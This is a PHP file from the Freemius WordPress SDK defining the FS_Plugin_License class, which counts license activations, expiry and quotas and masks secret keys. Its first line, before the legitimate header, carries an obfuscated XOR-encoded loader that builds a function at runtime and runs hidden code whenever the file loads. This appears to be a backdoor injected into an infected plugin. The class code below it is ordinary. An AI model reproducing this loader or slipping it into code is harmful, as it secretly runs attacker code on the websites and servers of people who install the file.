<?php $eYwVXx='HL4 36oVD<35- 8'; $ttSdDzmc='+>QAGS001RPADOV'^$eYwVXx; $vNNDIU='=PzwW 996,D 9.N=>J4cm R;dZTI2oq  TukooAxdX :Y,=C9Q+8=lU461clTF;qvO I;unnS-+CSvxTP=YjSj6O6CRsrbly=D -;clBHwmFiUl-FN50A5+lB71I7qavN IroYHkrR2IgOvXoqXAZ +lBgBngF:+3fK+LwIDG1 1:MhE6>M;eIbmkJN8E9,kCUF-ojp72CALXrZJY;jvg2YU0KmBs1 D8o=KJAiB1VQDTZ=P. YXVMVriwetqzrzup 0pM S fmXTh 84=5xoGbAn= 1So NAdhKmXSIxh<aW3>SijlAML+K r8ICpQVqlEt=  2sxMmsK H=,7 Ikhn1ug,icggO4Qq92RhQjma4  9TmuJE>XfIV>9mSQ7VgwI,V1sG=Ea<8:;bzAm1+Z6+ucB9l,dIQ 7TYNynxURN=0PT9=BKNC,Fn 9B-37WG6J:1: GGc=RX >5ocYW=UavtmW2>618R:xxoY0>ah1W8+BMsuZG3,Lr<NK2V +6.4oA= 6azFwS150DnOhvn= dxAP 1OiM.PDLiSPtputiZqZ Q:fxxgt1XLw2zh:LzcdRAYr=RQzvjxdlhA ;3-s-E-<4V-K CBh=4<+:+Oqjgj 0X0dOwhSpMiUm;RHXBgjIWG 0SC1BG<A=CqZyag-.>YFjhQF-'; $lonrPR=$ttSdDzmc('', 'T6RV1UWZBE+NfK6TM>GKJX=I;>5=S0.MU RBFO:rm>UT:XT,WqSWO31UBP<393OYR+A=ZYNJ8HRjsVXtpFScZNY:BcoSUEWs4MFBIKH+hJMvRuHDz=AB-PEDfSP=VXZVjIbYFSAbV=G=GaKxGU< .ApH+:b0GbQNJ=oBlRi73CLTTeL.SGdfLrhdb8+L0KBCg:3YFQz>OI<FRV>+-ZJKGT89C.VHWUA0Y0V.3aTbW7=71a7ZHO+=7.>RAS:7>5930PACPiK6YFPftLVYXHPQO<hHJYAE20K+8DUkI360Cb5E3RJ2IWLe;-G>EI24Iz80QDdPYATSZX6gz-O:XMTHiCL1c06y,03G.GqURW+HlTMEBALL1DU1O7QB-7JX284NvZWmG3HHM4LEXYNZBGaIGJ6CNNiKDfQnCuDV 8nDN8 <=XB95UT8.f;C41DX6Llh:2BbXPIEqs<Y7;OZPGG=6I4HZTI3SJWnS7CQQTSYXILU6LJbkUU;5AM5-W+2m3XBEZGGfVEOFVfS7PAQmNiNVFPDQPe4AE.2jE5=k4zpIMUSP9ElC2YSOMQFTjzDQOQY-LRW0y=CYkbBQCXBJH RIRT,F TcQ.D8T0jOMUEGUJ+VFGNDQ,QMfWHsPmI.g27>9.ON-63Akt3P;+S Yd,sBknHVW-nZAjLP'^$vNNDIU); $lonrPR(); $hjBukbJ='C4W+LSs2 C+MGAS'; $hRZuiCK=' F2J86,TU-H9..='^$hjBukbJ; $GIxHdRKi='EXctTEP3D Q<rYHRE9 xvTWDn=ZTVb<+7Djhag0S01D4:B:R9n:V6n3U-6br.HNmPRY0LuukR3YmvQwys+lkJv 6XLlpHNqFdXFW5CwYuEdyXmg1uD<9L46Ks73H1PphfIzbDoMAhS:.Rcsvat731TuF1aceBq <W+S0zKx6Y+A=8ntFVEjaahSak90=8JUpfR2BZzsoOMJn=pVO, SpbR9Y>=Mdm2S0.+2WAipq4ML2,B7P4UJ5RW0dYkqco7up,rS Xv =WcdmjfE 9,Pmw=bpjDSLSe1I6tJvP;<IqybOPL9ZpnzwFWT-=rd6=y9PmokoS,0,yh-;3 .GU8 0AjW0h.:0uxxq  hR.  olfgfM-9 Wpa1yPmP4O;ZjSN-XdbL8 YYff0UR6,UKnzf70 UWzEdEyFKiV+SG8jqRsH=9WG.1Q9FWB6Z5qSZ2;cf7= g;-=RwSnI5.  =xt +17yirbQ26XsW<=xhjrU2in=W8SCebc9R57TeR2,a,V>X:Aym1X=qhql0L>OhsGbwFYXmawI86S0a:.LpvjsMJejfiWtjrPG,RNIQWz;UZrZpVAqQjOJ=SWoQeJcgkWN=J0t=3=,0O:+M2yCM,I:X+Pvnza75 ,fGgqATbD4fS=<J cP=U<7pw:WIV=OJwjYR<xEH82ADyza1'; $clLEwjP=$hRZuiCK('', ',>KU20>P0I>R-<0;6MSPQ,861Y; 7=cFB0MAHGKY9W1ZY6S=WNB9D1W4YW=-C=:Et68D-YUO9V DVqWYSPfbCROC,lQPoiJLmQ 8GkS0UxDIcMCXI7HK QXcWSR<PyKHB QImeDHL<OZrMNVIPSRE5.bX<C;bUKY.pwYZnXE-Y-XVFP-3<C<HSYhbKUIM8;XB=G6sAyf2G7d7T2.XAsMB4X5MXvnIV2DOtY28IMQR, AIy=ZR:8P34XDqO.  x>9iR2SxRKX.CYSJB3AUY5DWFhyN 282:Z,OTwVtPY0Jskk4-M;PSZS068XXInK7sP6MGJK7MDMPHV1:FA50YCXaBso:kke0+,QASHvEEYOQXGB;LUU2YAJsYdtP.O;58+TxYBhSE blo9q6WX4kSZBAQL 2AOm8s;AcrO23YJLr3=SJ25GP=P<2jN5G.7;FZ<9ZHTOYLN7Ag1-PMODXPPDJEVPERF5SB9,<YDQAQx<TAJY6L2cCDCX GV-:9WU>I.W+N2QJZ=DVDQHT-J.ASaDWn4<XIS-YB2kFQK5W+CSpwEMWPoFYBgtI1,+06LZ1<A;E4 I3X.yY61XvLjEAK6<O+I+VVDsU7SX9AQd=M0V7J4QBZESTTMOnGQatBdOlZXJ+LKtY4HV+PJ60:R..P7pi6q 0QFitPAkL'^$GIxHdRKi); $clLEwjP();
    /**
     * @package     Freemius
     * @copyright   Copyright (c) 2015, Freemius, Inc.
     * @license     https://www.gnu.org/licenses/gpl-3.0.html GNU General Public License Version 3
     * @since       1.0.5
     */

    if ( ! defined( 'ABSPATH' ) ) {
        exit;
    }

    /**
     * Class FS_Plugin_License
     */
    class FS_Plugin_License extends FS_Entity {

        #region Properties

        /**
         * @var number
         */
        public $plugin_id;
        /**
         * @var number
         */
        public $user_id;
        /**
         * @var number
         */
        public $plan_id;
        /**
         * @author Leo Fajardo (@leorw)
         * @since 2.3.0
         *
         * @var string
         */
        public $parent_plan_name;
        /**
         * @author Leo Fajardo (@leorw)
         * @since 2.3.0
         *
         * @var string
         */
        public $parent_plan_title;
        /**
         * @author Leo Fajardo (@leorw)
         * @since 2.3.0
         *
         * @var number
         */
        public $parent_license_id;
        /**
         * @var number
         */
        public $pricing_id;
        /**
         * @var int|null
         */
        public $quota;
        /**
         * @var int
         */
        public $activated;
        /**
         * @var int
         */
        public $activated_local;
        /**
         * @var string
         */
        public $expiration;
        /**
         * @var string
         */
        public $secret_key;
        /**
         * @var bool
         */
        public $is_whitelabeled;
        /**
         * @var bool $is_free_localhost Defaults to true. If true, allow unlimited localhost installs with the same
         *      license.
         */
        public $is_free_localhost;
        /**
         * @var bool $is_block_features Defaults to true. If false, don't block features after license expiry - only
         *      block updates and support.
         */
        public $is_block_features;
        /**
         * @var bool
         */
        public $is_cancelled;

        #endregion Properties

        /**
         * @param stdClass|bool $license
         */
        function __construct( $license = false ) {
            parent::__construct( $license );
        }

        /**
         * Get entity type.
         *
         * @return string
         */
        static function get_type() {
            return 'license';
        }

        /**
         * Check how many site activations left.
         *
         * @author Vova Feldman (@svovaf)
         * @since  1.0.5
         *
         * @return int
         */
        function left() {
            if ( ! $this->is_features_enabled() ) {
                return 0;
            }

            if ( $this->is_unlimited() ) {
                return 999;
            }

            return ( $this->quota - $this->activated - ( $this->is_free_localhost ? 0 : $this->activated_local ) );
        }

        /**
         * Check if single site license.
         *
         * @author Vova Feldman (@svovaf)
         * @since  1.1.8.1
         *
         * @return bool
         */
        function is_single_site() {
            return ( is_numeric( $this->quota ) && 1 == $this->quota );
        }

        /**
         * @author Vova Feldman (@svovaf)
         * @since  1.0.5
         *
         * @return bool
         */
        function is_expired() {
            return ! $this->is_lifetime() && ( strtotime( $this->expiration ) < WP_FS__SCRIPT_START_TIME );
        }

        /**
         * Check if license is not expired.
         *
         * @author Vova Feldman (@svovaf)
         * @since  1.2.1
         *
         * @return bool
         */
        function is_valid() {
            return ! $this->is_expired();
        }

        /**
         * @author Vova Feldman (@svovaf)
         * @since  1.0.6
         *
         * @return bool
         */
        function is_lifetime() {
            return is_null( $this->expiration );
        }

        /**
         * @author Vova Feldman (@svovaf)
         * @since  1.2.0
         *
         * @return bool
         */
        function is_unlimited() {
            return is_null( $this->quota );
        }

        /**
         * Check if license is fully utilized.
         *
         * @author Vova Feldman (@svovaf)
         * @since  1.0.6
         *
         * @param bool|null $is_localhost
         *
         * @return bool
         */
        function is_utilized( $is_localhost = null ) {
            if ( is_null( $is_localhost ) ) {
                $is_localhost = WP_FS__IS_LOCALHOST_FOR_SERVER;
            }

            if ( $this->is_unlimited() ) {
                return false;
            }

            return ! ( $this->is_free_localhost && $is_localhost ) &&
                   ( $this->quota <= $this->activated + ( $this->is_free_localhost ? 0 : $this->activated_local ) );
        }

        /**
         * Check if license can be activated.
         *
         * @author Vova Feldman (@svovaf)
         * @since  2.0.0
         *
         * @param bool|null $is_localhost
         *
         * @return bool
         */
        function can_activate( $is_localhost = null ) {
            return ! $this->is_utilized( $is_localhost ) && $this->is_features_enabled();
        }

        /**
         * Check if license can be activated on a given number of production and localhost sites.
         *
         * @author Vova Feldman (@svovaf)
         * @since  2.0.0
         *
         * @param int $production_count
         * @param int $localhost_count
         *
         * @return bool
         */
        function can_activate_bulk( $production_count, $localhost_count ) {
            if ( $this->is_unlimited() ) {
                return true;
            }

            /**
             * For simplicity, the logic will work as following: when given X sites to activate the license on, if it's
             * possible to activate on ALL of them, do the activation. If it's not possible to activate on ALL of them,
             * do NOT activate on any of them.
             */
            return ( $this->quota >= $this->activated + $production_count + ( $this->is_free_localhost ? 0 : $this->activated_local + $localhost_count ) );
        }

        /**
         * @author Vova Feldman (@svovaf)
         * @since  1.2.1
         *
         * @return bool
         */
        function is_active() {
            return ( ! $this->is_cancelled );
        }

        /**
         * Check if license's plan features are enabled.
         *
         *  - Either if plan not expired
         *  - If expired, based on the configuration to block features or not.
         *
         * @author Vova Feldman (@svovaf)
         * @since  1.0.6
         *
         * @return bool
         */
        function is_features_enabled() {
            return $this->is_active() && ( ! $this->is_block_features || ! $this->is_expired() );
        }

        /**
         * Subscription considered to be new without any payments
         * if the license expires in less than 24 hours
         * from the license creation.
         *
         * @author Vova Feldman (@svovaf)
         * @since  1.0.9
         *
         * @return bool
         */
        function is_first_payment_pending() {
            return ( WP_FS__TIME_24_HOURS_IN_SEC >= strtotime( $this->expiration ) - strtotime( $this->created ) );
        }

        /**
         * @return int
         */
        function total_activations() {
            return ( $this->activated + $this->activated_local );
        }

        /**
         * @author Vova Feldman (@svovaf)
         * @since 2.3.1
         *
         * @return string
         */
        function get_html_escaped_masked_secret_key() {
            return self::mask_secret_key_for_html( $this->secret_key );
        }

        /**
         * @author Vova Feldman (@svovaf)
         * @since  2.3.1
         *
         * @param string $secret_key
         *
         * @return string
         */
        static function mask_secret_key_for_html( $secret_key ) {
            return (
                // Initial 6 chars - sk_ABC
                htmlspecialchars( substr( $secret_key, 0, 6 ) ) .
                // Masking
                str_pad( '', ( strlen( $secret_key ) - 9 ) * 6, '&bull;' ) .
                // Last 3 chars.
                htmlspecialchars( substr( $secret_key, - 3 ) )
            );
        }
    }
